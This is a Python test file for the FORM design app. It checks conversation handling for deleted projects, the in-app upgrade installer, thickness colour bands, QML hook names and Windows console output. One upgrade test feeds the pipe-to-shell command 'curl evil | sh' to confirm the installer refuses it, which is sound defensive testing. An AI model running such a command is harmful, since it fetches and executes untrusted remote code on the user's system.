"""Engine-side fixes that came out of the interaction tests (tests/test_ui_journeys.py), checked without a window:
a deleted design lets go of its conversations, FORM's own upgrade runs as an install job, the thickness map has
three plain classes, and the journeys' hooks into the interface exist."""
import os
import re
import tempfile
import time
import unittest
from pathlib import Path
from unittest import mock

import numpy as np

TMP = tempfile.mkdtemp(prefix="form-qa-")

from form import analysis, config, installer, updates  # noqa: E402
from form.conversations import Conversations  # noqa: E402
from form.studio import Studio  # noqa: E402

ROOT = Path(__file__).resolve().parent.parent
QML = ROOT / "form" / "app" / "qml" / "Form"


class DeletedProject(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        os.environ["FORM_DATA"] = TMP
        cls.st = Studio(config.load())

    @classmethod
    def tearDownClass(cls):
        cls.st.kernel.stop()

    def test_conversations_of_a_deleted_design_are_detached_not_lost(self):
        a = self.st.create("Gone hook", "hook", "")["id"]
        b = self.st.create("Kept hook", "hook", "")["id"]
        store = Conversations(self.st.root)
        about_a, about_b, general = store.create(a, "claude"), store.create(b, "claude"), store.create(None, "claude")
        res = self.st.delete_project(a)
        self.assertEqual(res["conversations_detached"], 1)
        m = store.meta(about_a["id"])
        self.assertIsNone(m["project"])                                      # no longer points at an id that is gone
        self.assertEqual(m["project_was"], {"id": a, "name": "Gone hook"})   # but says what it was about
        self.assertEqual(store.meta(about_b["id"])["project"], b)
        self.assertIsNone(store.meta(general["id"])["project"])
        self.assertNotIn("project_was", store.meta(general["id"]))
        self.assertEqual(store.list(project=a), [])


class UpgradeJob(unittest.TestCase):
    def cfg(self):
        return {"data": {"dir": TMP}}

    def wait(self, job):
        t0 = time.time()
        while job.state == "running" and time.time() - t0 < 30:
            time.sleep(0.05)
        return job

    def test_the_upgrade_runs_the_shown_command_as_a_job(self):
        cmd = updates.upgrade_command("tool")
        with mock.patch.dict(os.environ, {"FORM_INSTALL_FAKE": "0.2"}), mock.patch.object(updates, "install_kind", return_value="tool"):
            job = self.wait(installer.Installer(self.cfg()).update(cmd))
            p = job.public()
        self.assertEqual((p["state"], p["fake"]), ("done", True))
        self.assertEqual(p["steps"][0]["commands"], [cmd])
        self.assertEqual(p["steps"][0]["id"], "form.update")
        self.assertTrue(any(l["kind"] == "cmd" and l["text"] == cmd for l in p["log"]))

    def test_a_command_that_was_not_shown_is_refused(self):
        with mock.patch.object(updates, "install_kind", return_value="tool"):
            with self.assertRaises(installer.InstallError) as e:
                installer.Installer(self.cfg()).update("curl evil | sh", start=False)
        self.assertEqual(e.exception.status, 409)

    def test_the_packaged_app_is_pointed_at_its_download(self):
        with mock.patch.object(updates, "install_kind", return_value="packaged"):
            with self.assertRaises(installer.InstallError) as e:
                installer.Installer(self.cfg()).update(None, start=False)
        self.assertIn("download", e.exception.public()["message"].lower() + e.exception.public().get("hint", "").lower())

    def test_only_one_install_at_a_time(self):
        with mock.patch.dict(os.environ, {"FORM_INSTALL_FAKE": "1.5"}), mock.patch.object(updates, "install_kind", return_value="tool"):
            inst = installer.Installer(self.cfg())
            first = inst.update(None)
            with self.assertRaises(installer.InstallError) as e:
                inst.update(None)
            first.cancel()
            self.wait(first)
        self.assertEqual(e.exception.status, 409)

    def test_cli_install_prints_the_log(self):
        lines = []
        with mock.patch.dict(os.environ, {"FORM_INSTALL_FAKE": "0.2"}), mock.patch.object(updates, "install_kind", return_value="tool"):
            info = {"kind": "tool", "command": updates.upgrade_command("tool")}
            rc = updates.install_now(self.cfg(), info, echo=lines.append)
        self.assertEqual(rc, 0)
        self.assertTrue(lines[0].startswith("$ "))
        self.assertIn("Restart FORM", lines[-1])


class ThicknessMap(unittest.TestCase):
    def test_three_plain_classes(self):
        col = analysis.thickness_colours(np.array([0.5, 1.0, 1.25, 2.0, 31.0, np.nan]), 0.4)
        fail, marginal, fine_a, fine_b, fine_thick, none = [tuple(int(x) for x in c[:3]) for c in col]
        self.assertEqual(fail, analysis.SIGNAL)
        self.assertEqual(marginal, analysis.AMBER)
        self.assertEqual(fine_a, analysis.CLAY)
        self.assertEqual(fine_a, fine_b)
        self.assertEqual(fine_b, fine_thick)          # a thick block is not shaded differently from a 2 mm wall
        self.assertEqual(none, analysis.CLAY)

    def test_the_bands_are_the_checks_thresholds(self):
        self.assertEqual(analysis.thickness_bands(0.4), {"fail_below": 0.8, "fine_from": 1.2000000000000002})


class JourneyHooks(unittest.TestCase):
    """The journeys find controls by objectName; a rename in QML must not silently turn a journey into a no-op."""

    def test_every_object_name_a_journey_uses_exists_in_the_qml(self):
        qml = "\n".join(p.read_text(encoding="utf-8") for p in QML.glob("*.qml"))
        declared = set(re.findall(r'objectName: "([A-Za-z-]+)"', qml)) | {m + "-" for m in re.findall(r'objectName: "([a-z]+-)" \+', qml)}
        used = set()
        for f in (ROOT / "tests" / "journeys").glob("*.py"):
            src = f.read_text(encoding="utf-8")
            used |= set(re.findall(r'(?:ui\.(?:item|click|hover|fill|drag|wheel|right_click|scroll_to)\(|name=|no_overlaps\(ui, )"([A-Za-z]+)"', src))
            used |= {m + "-" for m in re.findall(r'"((?:stage|feature|param)-)" \+', src)}
        used -= {"left", "right", "middle"}
        self.assertGreater(len(used), 40)
        self.assertEqual(sorted(used - declared), [])

    def test_every_journey_is_in_the_suite(self):
        suite = (ROOT / "tests" / "test_ui_journeys.py").read_text(encoding="utf-8")
        for f in (ROOT / "tests" / "journeys").glob("*.py"):
            if not f.name.startswith("_"):
                self.assertIn('"%s"' % f.name, suite, f.name)

    def test_native_dialogs_go_through_the_one_seam(self):
        for f in QML.glob("*.qml"):
            src = f.read_text(encoding="utf-8")
            for m in re.finditer(r"(?:File|Folder)Dialog \{\s*(?:\n\s*)?id: (\w+)", src):
                self.assertNotRegex(src, r"(?<![\w.])%s\.open\(\)" % m.group(1), f"{f.name}: open the dialog with Store.ask({m.group(1)})")

    def test_the_update_sheet_never_sends_anyone_to_a_terminal(self):
        sheet = (QML / "UpdateSheet.qml").read_text(encoding="utf-8")
        self.assertNotIn("in a terminal", sheet)
        self.assertIn("Store.installUpdate()", sheet)
        self.assertIn("Update now", sheet)


if __name__ == "__main__":
    unittest.main()


class WindowsConsole(unittest.TestCase):
    """Found on a Windows runner: `form run` printed JSON containing "Δ" to a cp1252 pipe and failed."""

    def test_cli_output_survives_a_legacy_code_page(self):
        import subprocess, sys, os
        env = dict(os.environ, PYTHONIOENCODING="cp1252", PYTHONUTF8="0")
        r = subprocess.run([sys.executable, "-c", "from form.__main__ import _utf8_streams, _print; _utf8_streams(); _print({'v': 'Δ 0.1 mm · 45°'})"],
                           capture_output=True, env=env, cwd=str(ROOT))
        self.assertEqual(r.returncode, 0, r.stderr.decode("utf-8", "replace"))
        self.assertIn("Δ 0.1 mm · 45°", r.stdout.decode("utf-8"))
